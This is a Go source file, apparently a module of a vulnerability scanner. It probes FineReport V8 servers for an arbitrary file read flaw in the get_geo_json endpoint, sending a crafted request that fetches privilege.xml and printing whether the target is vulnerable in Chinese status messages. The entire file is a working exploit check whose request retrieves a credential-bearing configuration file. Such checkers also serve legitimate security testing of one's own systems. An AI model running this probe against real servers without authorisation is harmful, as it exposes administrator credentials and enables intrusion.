package v8_get_geofileload

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(vulnUrl)

	if err == nil && resp.StatusCode == 200 {
		// 检查响应体是否包含 "xml" 关键字
		return strings.Contains(resp.String(), "xml")
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		color.Green.Println("[+]	帆软报表 V8 get_geo_json 任意文件读取漏洞存在 -> ", url)
	} else {
		color.Red.Println("[-]	帆软报表 V8 get_geo_json 任意文件读取漏洞不存在")
	}
}
